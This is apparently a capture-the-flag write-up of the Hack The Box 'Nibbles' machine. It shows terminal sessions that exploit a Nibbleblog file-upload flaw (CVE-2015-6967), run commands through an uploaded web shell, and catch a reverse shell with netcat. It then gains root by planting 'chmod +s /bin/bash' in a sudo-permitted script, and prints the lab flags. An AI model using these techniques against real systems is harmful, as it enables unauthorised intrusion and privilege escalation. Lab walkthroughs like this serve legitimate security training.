
### Initial access
We read source code and see nibblesblog dir and found README dir and found the vulnerable to exploit.

```bash
┌──(kali㉿kali)-[~/HTB/Nibbles]
└─$ searchsploit Nibbleblog                               
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                                                                                                                                     | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                                                                      | php/remote/38489.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                   
```


```
┌──(kali㉿kali)-[~/HTB/Nibbles/CVE-2015-6967]
└─$ python3 exploit.py --url http://10.129.39.29/nibbleblog/ --username admin --password nibbles --payload shell.php
[+] Login Successful.
[+] Upload likely successfull.
[+] Exploit launched, check for shell.


┌──(kali㉿kali)-[~/HTB/Nibbles/CVE-2015-6967]
└─$ curl http://10.129.39.29/nibbleblog/content/private/plugins/my_image/image.php?cmd=id                                                                                            
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
                                                             
┌──(kali㉿kali)-[~/HTB/Nibbles/CVE-2015-6967]
└─$ curl http://10.129.39.29/nibbleblog/content/private/plugins/my_image/image.php?cmd=id                                                                                            
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
                                                                                                                      
                                                             
                                                           
  ┌──(kali㉿kali)-[~/HTB/Nibbles]
└─$ rlwrap nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.16.212] from (UNKNOWN) [10.129.39.29] 55524
bash: cannot set terminal process group (1364): Inappropriate ioctl for device
bash: no job control in this shell
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ 

nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
4c072287cfe8639dfe6ccafbfc28628f


                                                  
```

### Priv escalation

```
nibbler@Nibbles:/home/nibbler$ sudsudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


nibbler@Nibbles:/home/nibbler$ mkdir personal
mkdir personal
nibbler@Nibbles:/home/nibbler$ cd personal
cd personal
nibbler@Nibbles:/home/nibbler/personal$ mkdir stuff
mkdir stuff
nibbler@Nibbles:/home/nibbler/personal$ echo "chmod +s /bin/bash" > /home/nibbler/personal/stuff/monitor.sh
r/personal/stuff/monitor.sh /home/nibble 
nibbler@Nibbles:/home/nibbler/personal$ sudo /home/nibbler/personal/stuff/monitor.sh
r.sh /home/nibbler/personal/stuff/monito 
sudo: /home/nibbler/personal/stuff/monitor.sh: command not found
nibbler@Nibbles:/home/nibbler/personal$ chmod +x /home/nibbler/personal/stuff/monitor.sh
nitor.sh /home/nibbler/personal/stuff/mo 
nibbler@Nibbles:/home/nibbler/personal$ sudo /home/nibbler/personal/stuff/monitor.sh
r.sh /home/nibbler/personal/stuff/monito 
nibbler@Nibbles:/home/nibbler/personal$ bash -p
bash -p
bash-4.3# id
id
uid=1001(nibbler) gid=1001(nibbler) euid=0(root) egid=0(root) groups=0(root),1001(nibbler)
bash-4.3# 

bash-4.3# cat root.txt
cat root.txt
5f2ce598333b2de3f3cdafe78687ebfd

```
### Post exploit